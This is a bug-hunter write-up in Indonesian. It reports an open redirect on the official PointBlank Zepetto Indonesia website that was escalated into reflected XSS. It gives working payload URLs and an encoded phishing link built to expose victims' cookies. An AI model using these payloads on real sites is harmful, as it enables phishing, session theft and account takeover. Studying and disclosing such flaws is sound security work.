# Open Redirect Vulnerability Lead to XSS Injection at Official Website of PointBlank Zepetto Indonesia
### Author : Mikhro <br><a href="https://www.facebook.com/josh.s.mikhael" rel="nofollow"><img src="https://img.shields.io/badge/contact-facebook-blue.svg" alt="Twitter" data-canonical-src="https://img.shields.io/badge/facebook-josh.s.mikhael-blue.svg" style="max-width:100%;"></a>
> #Exploit #XSS #Injection #PointBlank_Zepetto #Bug #OpenRedirect



## Apa itu Open Redirect Vulnerability ??
Berdasarkan https://s0cket7.com/open-redirect-vulnerability/ dapat disimpulkan bahwa : <br>
**Open Redirect** atau **Pengalihan Terbuka** adalah jenis celah/bug yang memungkinkan seseorang (misalkan : seorang **Attacker/Hacker**) untuk mengalihkan sebuah situs web (*Website Victim*)
menuju ke situs web apapun tanpa adanya ~~peringatan~~ akan meninggalkan situs tersebut.

## Apa itu XSS Injection ?? 
Dikutip dari https://id.m.wikipedia.org/wiki/XSS, <br>
**XSS** merupakan salah satu jenis serangan *injeksi code* (code injection attack). XSS dilakukan oleh penyerang dengan cara memasukkan kode HTML atau client script code lainnya ke suatu situs. Serangan ini akan seolah-olah datang dari situs tersebut. Akibat serangan ini antara lain penyerang dapat mem-bypass keamanan di sisi klien, mendapatkan informasi sensitif, atau menyimpan aplikasi berbahaya.

## Proof Of Concept
Pada hari Minggu, 07/04/2019 sekitar jam 16.00 saya sedang duduk santai di teras rumah utk menikmati sore hari sambil ngopi . Saat itu saya merasa sangat bosan sehingga akhirnya saya memutuskan mengambil hp Android kesayangan saya dan berencana bermain PUBG sebentar . Sebelum main saya menyempatkan untuk melihat-lihat beranda facebook. Ketika scroll beranda , saya melihat ada postingan dari Official Fanpage PointBlank Zepetto Indonesia tentang update patch serta new map & new mode . Berhubung saya juga sudah lama tidak memainkan game tersebut , saya pun tertarik untuk mencari tahu event² apa saja yg sedang berlangsung di game ini .<br> Sampe akhirnya saya mengunjungi fanpage dari game ini. Setelah membaca postingan fanpage saya beralih untuk membaca berita langsung dari website resmi nya . Saat itu entah kenapa terlintas di pikiran saya untuk iseng mencari bug dan melakukan penetration testing pada website tersebut.

![Screenshot_Websige_Pb_Zepetto](https://robotmikhro.github.io/img/Screenshot_2019-04-11-15-52-53-567_com.android.chrome.png)

Hal pertama yang akan saya lakukan adalah melakukan pengecekan pada halaman dashboard user/halaman info. Setelah itu saya cek satu-satu pertama pada bagian Submit Ticket lalu halaman Profil dan Notification . Namun saya tidak menemukan adanya celah dibagian tersebut. Berpikir sejenak , sambil menyeruput kopi , tiba-tiba perhatian saya tertuju bagian widget "PUSAT ISI ULANG" . 

![ss-pusat-isi-ulang](https://robotmikhro.github.io/img/IMG_20190411_161346.jpg)
Pikir saya mungkin saja pada bagian tersebut ada form yg vuln akan xss atau gak sqli :v . Dengan rasa penasaran , saya pun mengklik widget tersebut . Setelah mengklik saya langsung ter-redirect ke link https://topup.pointblank.id/Topup/Index . Terlintas dalam pikiran saya bahwa ketika saya ter-redirect tidak ada ~~notice~~ akan meninggalkan website https://wwww.pointblank.id/mypage/info melainkan langsung ter-redirect begitu saja . "Hmm .. " , guman saya. "Mungkinkah vuln akan open redirect ?",kata saya dalam hati. <br> Untuk menyelidiki hal tersebut, saya pun mencari tools untuk melakukan sniff pada website, berhubung saya hanya bermodalkan Smartphone Android , saya memakai [Net Capture](https://play.google.com/store/apps/details?id=com.minhui.networkcapture&hl=en_US&referrer=utm_source%3Dgoogle%26utm_medium%3Dorganic%26utm_term%3Dnet+capture&pcampaignid=APPU_1_eguvXOzMLcz5vAS6lYfwDw). Sebelum itu saya kembali ke halaman info lalu menyalakan Net Capture dan mengklik ulang widget "PUSAT ISI ULANG PB" . Dan ini hasilnya :
![ss-hasil-sniff](https://robotmikhro.github.io/img/IMG_20190411_164357.jpg)

•Jika kita lihat pada bagian GET ada parameter :
> ?redirect_url=https://topup.pointblank.id

•Lalu saya coba ganti url pada param tsb dengan https://www.google.com , sehingga menjadi seperti ini :
> https://www.pointblank.id/topup/auth?redirect_url=https://www.google.com


•Hasilnya website ter-redirect dengan baik . Tanpa ada ~~notice~~ untuk meninggalkan website. 
![ss-sukses-redir-ke-google](https://robotmikhro.github.io/img/IMG_20190411_172620.jpg) <br><br>
•Hasil sniff : <br>
![ss-hasil-sniff](https://robotmikhro.github.io/img/IMG_20190411_172804.jpg) <br><br>
"Yeah ! Vuln **Open Redirect** ! 😃... ", kata saya dengan perasaan senang ! <br>
![senang](https://media.giphy.com/media/yhRnl31SmMec/giphy.gif)

Walau saya sudah menemukan bug open redirect , rasanya saya belum puas. "Mungkin saja bug ini bisa menjadi bug XSS juga!Hmm... ",pikir saya.<br>
![hmm](https://media.giphy.com/media/3oFzm6E7ULKzGbLm80/giphy.gif) <br>

Maka dari itu saya kembali melakukan research . Krn saya sempet melihat² di google dan hacker one, kebanyakan bug **Open Redirect** "*can lead*" to **XSS Injection** . <br>
Sayapun mengecek kembali hasil sniff sebelumnya , dan apa yg saya temukan ? <br>
![ss_kodejs](https://robotmikhro.github.io/img/IMG_20190411_184642.jpg) <br><br>
•Berikut kodenya :
```
<script type="text/javascript">
	$(window).on("load",
 function() {
	
			document.location='https://www.google.com?access_token=8yBkBhDOZOgz1cumNxfU5Ib8Py%2Be4xcn%2FS3buZRsjntsV4459wFto99j%2B83K1W67drk%2BaNP5IyyeaUS%2BZEVrKXdSbOfIbVpA3IZABGgJ7Zk%3D';
	
		
});
	</script>
```
Melihat kode diatas dapat saya simpulkan bahwa url *google.com* yang ada pada parameter "*?redirect_url=*" ter-refleksi ke dalam kode javascript ini sehingga proses redirect dapat berjalan dengan baik .<br>
Disini yang harus saya lakukan adalah melakukan bypass pada document.location . Saya berusaha memahami kode javascript ini dan mencari tahu bagaimana agar saya dapat membypass "*document.location*" dan memunculkan pop up **XSS** . <br> Dibantu oleh teman saya [@anysz](https://github.com/anysz) akhirnya saya sukses melakukan bypass. Berikut langkah-langkahnya : <br><br>

### Langkah - Langkah Bypassing *document.location* :
1. **Memahami alur kode dan menemukan inject point** : <br> Jika kita lihat , melalui kode di atas inject point nya terletak di akhir url <br> ``` document.location='https://www.google.com' ``` (perhatikan yang saya beri tanda petik , disitulah inject pointnya). Disitulah kita akan mulai melakukan bypass. <br>
2. **Menggunakan fungsi "*strpos()*"** : <br> Lalu saya mencoba untuk memasukkan ``` .strpos(0,0); ``` <br> 
(Note : penggunaan titik (.)strpos(0,0) digunakan untuk memanggil fungsi)
 .  Sehingga menjadi seperti ini ``` document.location='https://www.google.com'.strpos(0,0); ``` . Namun tidak terjadi apa² & page tidak ter-redirect.<br>
 > Note : Disitu 0,0 artinya ambil dari index 0 sampe 0, sedangkan ini kan berarti string kosong. <br>


3. **Mempertimbangan penggunaan fungsi "*substr()*" lebih disarankan ketimbang fungsi "*strpos()*"**<br> Setelah melalui beberapa pertimbangan , jika kita perhatikan string ``` document.location ```itu sudah ada isinya yaitu "*google.com*" jadi untuk membersihkannya menurut saya (dibantu oleh referensi dari google) lebih prefer menggunakan fungsi [substr()](https://www.malasngoding.com/manipulasi-string-pada-javascript/) ketimbang fungsi [strpos()](https://www.duniailkom.com/tutorial-php-cara-mencari-posisi-string-php-fungsi-strpos/) atau bisa dikatakan penggunaan substr itu untuk mengambil slice dari string nya . Saya tambahkan 0,0 menjadi
.substr(0,0); , jika kita taro di parameter jadi seperti ini : <br> ``` ?redirect_url=https://www.google.com'.substr(0,0); ``` <br><br>
![this_ss_sniff](https://robotmikhro.github.io/img/IMG_20190411_211414.jpg) <br>
![this_ss_kodejs](https://robotmikhro.github.io/img/IMG_20190411_211441.jpg) <br> Namun page tetap tidak ter-redirect. <br>
4. **Menambahkan fungsi "*concat(urlnya)*" untuk menggabungan string dengan string dengan urlnya *diarray*** : <br> Maka dari itu saya coba menambahkan ```.concat('https:','//','ramaren.com'); ```  jika digabungkan menjadi seperti ini <br>
``` document.location='https://www.google.com'.substr(0,0).concat('https:','//','ramaren.com'); ``` . Namun seperti sebelum²nya page masi belom ter-redirect .<br>
5. **Menambahkan "*//*" dibagian akhir kode** : <br> Untuk mengatasi page yang masi belom ter-redirect (belum sukses membypass) itu ternyata akibat dari adanya error syntax pada javascript, 
solusinya kita perlu menambahkan "**//**" dibagian akhir. <br>Bentuk url & parameter secara keseluruhan menjadi seperti ini : <br>
> https://pointblank.id/topup/auth?redirect_url=https://www.google.com'.substr(0,0).concat('https:','//','ramaren.com');//```<br>

Fungsinya apa sih? fungsi nya untuk mematikan "*?access_token=token*" agar tidak terjadi error syntax pada kode javascript tersebut. <br>
Lalu coba kita execute url tersebut di browser dan liat hasilnya : <br>
![video_to_gif](https://robotmikhro.github.io/img/Screenrecorder201904120437.gif) <br><br>
**Nah sampai pada tahap ini kita sudah berhasil melakukan bypass pada document.location** .<br>
•Dan untuk memunculkan *Pop Up XSS* yang perlu kita lakukan hanya menambahkan :
``` ;alert(2);// ```  dan mengganti yang ada pada concat() dari "*https://ramaren.com*" menjadi "*document.location*" . Mengapa  mesti "*document.location*" ? Soalnya itu ngereplace document.location 
sama string yg baru, kalau di replace sama dirinya sendiri kan berarti 
engggak ada yg berubah. Umpamanya  nya jadi kayak gini ``` document.location = document.location ```  , sehingga klu digabungin sama url lengkapnya jadi begini : <br>

> https://pointblank.id/topup/auth?redirect_url=https://www.google.com'.substr(0,0).concat(document.location);alert("XSS");//  <br> 

•Lalu coba kita eksekusi di browser.<br>
![ss-sukses-xss](https://robotmikhro.github.io/img/IMG_20190412_050853.jpg) 

yeahh ! 😎 XSS sukses ter-eksekusi dan memunculkan pop up 😁 ... <br><br>

Saya juga akan menunjukkan bagaimana skema seorang attacker untuk mengelabui korban/victim (disini ceritanya si victim adalah user dari website tersebut) dan mencuri cookienya . Simak berikut ini :
### Skema Attacker/Hacker ketika melakukan social engginering kepada korban/user untuk mendapatkan cookie  user (lengkap dengan gambar)

1. **Attacker melakukan social engineering melalui email :**<br>
Attacker akan mengirimkan link melalui email kepada user secara mass dengan iming² event berhadiah ;
``` https://www.pointblank.id/topup/auth?redirect_url=//www.google.com/2uX4ygk'.substr(0,0).concat(document.location);document.write('<center><h1><b>THANK YOU FOR YOUR ATTENTION ! :D</b></center></h1>');javascript:prompt("Dibagian ini user cookie user bisa dicuri oleh sang Attacker/Hacker ! Ini dia cookienya :",document.cookie);//  ``` <br>

Agar sang korbang tidak curiga , si Attacker melakukan encode pada url tersebut terutama yang bagian kode javascriptnya , menjadi seperti ini ;
> https://www.pointblank.id/topup/auth?redirect_url=%2f%2fwww.google.com%2f2uX4ygk%27%2e%73%75%62%73%74%72%280%2c0%29%2e%63%6f%6e%63%61%74%28%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%29%3b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%63%65%6e%74%65%72%3e%3c%68%31%3e%3c%62%3e%54%48%41%4e%4b%20%59%4f%55%20%46%4f%52%20%59%4f%55%52%20%41%54%54%45%4e%54%49%4f%4e%20%21%20%3a%44%3c%2f%62%3e%3c%2f%63%65%6e%74%65%72%3e%3c%2f%68%31%3e%27%29%3b%6a%61%76%61%73%63%72%69%70%74%3a%70%72%6f%6d%70%74%28%22%44%69%62%61%67%69%61%6e%20%69%6e%69%20%75%73%65%72%20%63%6f%6f%6b%69%65%20%75%73%65%72%20%62%69%73%61%20%64%69%63%75%72%69%20%6f%6c%65%68%20%73%61%6e%67%20%41%74%74%61%63%6b%65%72%2f%48%61%63%6b%65%72%20%21%20%49%6e%69%20%64%69%61%20%63%6f%6f%6b%69%65%6e%79%61%20%3a%22%2c%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%2f%2f <br>

•Berikut screenshot di sisi Attacker : <br>
![ss__email_attacker](https://robotmikhro.github.io/img/IMG_20190412_075536.jpg) <br>
2. **User membuka kotak masuk email nya dan terpengaruh dengan iming² si Attacker :** <br> Korban/user yang awam akan mudah terlena dan dengan penasaran segera mengklik link tersebut . xD <br>
•Berikut screenshot di sisi User : <br>
![ss_email_user](https://robotmikhro.github.io/img/IMG_20190412_080527.jpg) <br>
3. **User mengklik link tersebut dengan segera dan Walaaa ! :** <br>
![gif_si_user_mengklik_link](https://robotmikhro.github.io/img/Screenrecorder201904120815.gif) <br>
Sampai pada tahap ini Attacker sudah berhasil melakukan social engineering dan mengelabui User serta mencurinya cookienya .😌 <br>
Apalagi kalau akun si User belum diverifikasi , merupakan suatu keberuntungan karena sang Attacker bisa saja dengan mudah mengganti password akun User dan memasukkan emailnya untuk verifikasi akun sehingga Korban/User sama sekali tidak dapat mengakses akunnya lagi.😟 <br><br>


### Impact Bug XSS : 
- Seperti yang sudah saya jelaskan di atas melalui social engineering Attacker bisa mencuri cookie & mengambil alih sepenuhnya akun user.
### Impact Bug Open Redirect : 
- Attacker bisa saja menyisipkan website phising yang dishortener dengan bit.ly lalu mengirimkannya ke User/Korban menggunakan email/social media lain . Seperti pada skema XSS di atas , User awam mungkin akan mudah percaya karena melihat link/domain berasal dari domain resmi pihak PointBlank Zepetto Indonesia. <br> <br>

### Referensi :
- https://www.google.com <br>
- https://s0cket7.com/open-redirect-vulnerability <br>
- https://id.m.wikipedia.org/wiki/XSS <br>
- https://logsmylife.wordpress.com/2009/05/14/xplodecms-cross-site-scripting-xss-injection/ <br> <br>

### Penutup :
***Sekian Write Up dan Proof Of Concept dari saya . Jika ada salah dalam penggunaan kata , semoga dapat dimaafkan . <br> 
Pesan saya untuk Bug Hunter lain yang mungkin tidak memiliki fasilitas (laptop/PC) jangan patah semangat , karena seperti saya hanya berbekal Smartphone Android pun kamu tetap bisa selama ada kemauan untuk belajar dan effort yang keras . Terima kasih ! <br>
Have a Nice Day ! ^^***

























